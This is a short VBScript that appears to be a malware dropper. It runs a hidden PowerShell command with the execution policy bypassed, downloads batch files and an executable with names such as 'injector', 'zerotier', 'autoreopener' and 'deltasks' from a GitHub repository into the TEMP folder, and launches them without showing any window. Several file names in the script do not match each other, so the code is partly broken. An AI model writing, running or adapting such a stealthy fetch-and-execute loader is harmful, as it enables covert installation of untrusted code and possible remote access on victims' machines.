Set WshShell = CreateObject("WScript.Shell")

psCommand = "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/inh1.bat' -OutFile ""$env:TEMP\inh1.bat""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/zerotier1.bat' -OutFile ""$env:TEMP\inh1.exe""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/inh1.exe' -OutFile ""$env:TEMP\inh1.exe""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/autoreopener1.bat' -OutFile ""$env:TEMP\autoreopener1.bat""; " & _
            "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/injector1/main/deltasks1.bat' -OutFile ""$env:TEMP\deltasks1.bat""; " & _
            "Start-Process ""$env:TEMP\zerotier1.bat"" -Wait;" & _
            "Start-Process ""$env:TEMP\inh1.bat"" -Wait;" & _
            "Start-Process ""$env:TEMP\inh1.exe"" -Wait;" & _
            "Start-Process ""$env:TEMP\autoreopen1.bat"" -Wait;"


cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & psCommand & """"

WshShell.Run cmd, 0, False
